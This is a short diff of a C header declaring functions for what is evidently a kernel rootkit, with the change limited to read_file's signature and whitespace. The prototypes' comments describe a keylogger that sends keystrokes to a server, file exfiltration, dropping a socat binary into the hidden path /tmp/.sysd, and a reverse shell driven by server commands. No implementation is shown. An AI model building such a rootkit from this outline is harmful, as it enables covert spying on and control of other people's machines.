@@ -72,7 +72,7 @@ int exec_str_as_command(char *user_cmd);					// Execute a command string in user
 int send_to_server(char *message, ...);						// Send a message to the server
 int send_file_to_server(char *filename);					// Send a file to the server
 int network_worker(void *data);								// Kernel thread for network communication
-char *read_file(char *filename);							// Read the content of a file into a dynamically allocated buffer
+char *read_file(char *filename, int *readed_size);			// Read the content of a file into a dynamically allocated buffer
 int print_file(char *content, enum text_level level);		// Print the content of a buffer to the kernel log
 int close_socket(void);										// Release the socket
 int close_thread(void);										// Close the kernel thread
@@ -80,7 +80,7 @@ int epikeylog_init(int keylog_mode);						// Initialize the keylogger
 int epikeylog_send_to_server(void);							// Send keylogger content to the server
 int epikeylog_exit(void);									// Cleanup function for the keylogger
 int drop_socat_binaire(void);								// Drop the socat binary in /tmp/.sysd
-int launch_reverse_shell(void);							// Launch the reverse shell with socat
+int launch_reverse_shell(void);								// Launch the reverse shell with socat
 int stop_reverse_shell(void);								// Stop the reverse shell
 int rootkit_command(char *command, unsigned command_size);	// Handle commands received from the server
 
